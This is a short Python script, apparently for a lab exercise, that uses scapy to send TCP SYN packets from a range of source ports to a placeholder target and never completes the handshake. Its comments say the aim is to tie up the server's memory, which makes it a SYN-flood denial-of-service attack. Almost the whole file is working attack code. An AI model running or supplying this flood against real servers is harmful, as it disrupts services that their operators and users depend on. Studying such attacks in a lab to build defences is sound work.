#!/usr/bin/env python
from scapy.all import *

""" Send SYN.
	Get SYN/ACK.
	Make the server wait for the ACK. Wastes RAM on the server.
	Do this multiple times."""

"""Target:
	service apache2 start
	watch netstat -an | grep :80"""

i = IP(dst = TARGET_IP)
t = TCP(dport = TARGET_PORT)

for p in range(1000,1010):
	t.sport = p
	send(i/t)